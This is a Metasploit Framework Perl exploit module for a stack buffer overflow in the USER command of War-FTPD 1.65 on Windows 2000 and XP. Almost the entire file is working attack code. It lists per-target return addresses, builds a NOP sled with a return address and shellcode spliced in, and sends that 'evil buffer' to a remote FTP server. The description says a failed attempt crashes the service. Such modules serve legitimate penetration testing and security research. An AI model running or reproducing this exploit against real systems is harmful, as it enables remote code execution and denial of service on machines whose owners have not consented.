##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::warftpd_165_user;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'War-FTPD 1.65 USER Overflow',
	'Version'  => '$Revision: 1.2 $',
	'Authors'  => [ 'Fairuzan Roslan <riaf [at] mysec.org>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp' ],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload'  =>
	  {
		'Space' => 512,
		'BadChars'  => "\x00\x0a\x0d\x40",
		'Prepend'  => "\x81\xc4\x54\xf2\xff\xff"
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
		This module exploits the buffer overflow found in the USER command
	in War-FTPD 1.65. This particular module workd against Windows 2000
	and Windows XP targets. A failed attempt will bring down the service
	completely.    
}),

	'Refs'  =>
	  [
		['OSVDB', 875],
		['URL',   'http://seclists.org/lists/bugtraq/1998/Feb/0013.html'],
	  ],

	'DefaultTarget' => -1,
	'Targets' =>
	  [
		['Windows 2000 SP0-SP4 English', 0x750231e2],   # ws2help.dll
		['Windows XP SP0-SP1 English',   0x71ab1d54 ],	# push esp, ret
		['Windows XP SP2 English',       0x71ab9372 ],	# push esp, ret
	  ],

	'Keys'  => ['warftpd'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $evil = $self->MakeNops(1024);
	substr($evil, 485, 4, pack("V", $target->[1]));
	substr($evil, 600, length($shellcode), $shellcode);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return address 0x%.8x....", $target->[1]));

	my $r = $s->Recv(-1, 5);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	($r) = $r =~ m/^([^\n\r]+)(\r|\n)/;
	$self->PrintLine("[*] $r");

	$self->PrintLine("[*] Sending evil buffer....");
	$s->Send("USER $evil\r\n");
	$r = $s->Recv(-1, 5);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	return;
}


